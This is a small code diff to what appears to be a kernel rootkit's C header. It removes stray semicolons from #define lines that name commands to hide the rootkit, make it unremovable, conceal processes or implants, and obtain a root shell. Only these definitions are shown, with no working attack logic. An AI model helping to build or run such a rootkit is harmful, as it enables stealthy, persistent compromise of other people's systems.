@@ -38,12 +38,12 @@
 
 // =========================== Available Commands =======================
 
-#define ROOTKIT_HIDE "hide";		// command to hide rootkit => In this mode, in no way this rootkit be will be removable => ROOTKIT_REMOVE will not work
-#define ROOTKIT_SHOW "show";		// command to unhide rootkit => In this mode, ROOTKIT_PROTECT and ROOTKIT_REMOVE will work effectively
-#define ROOTKIT_PROTECT "protect";	// command to make rootkit unremovable (even if it can be seen in usermode).
-#define ROOTKIT_REMOVE "remove";	// command to make rootkit removable
-#define PROCESS "process";		// command to hide/unhide a running process/implant
-#define ROOT "root";			// command to get root shell
+#define ROOTKIT_HIDE "hide"		// command to hide rootkit => In this mode, in no way this rootkit be will be removable => ROOTKIT_REMOVE will not work
+#define ROOTKIT_SHOW "show"		// command to unhide rootkit => In this mode, ROOTKIT_PROTECT and ROOTKIT_REMOVE will work effectively
+#define ROOTKIT_PROTECT "protect"	// command to make rootkit unremovable (even if it can be seen in usermode).
+#define ROOTKIT_REMOVE "remove"		// command to make rootkit removable
+#define PROCESS "process"		// command to hide/unhide a running process/implant
+#define ROOT "root"			// command to get root shell
 
 
 // To copy value from userspace
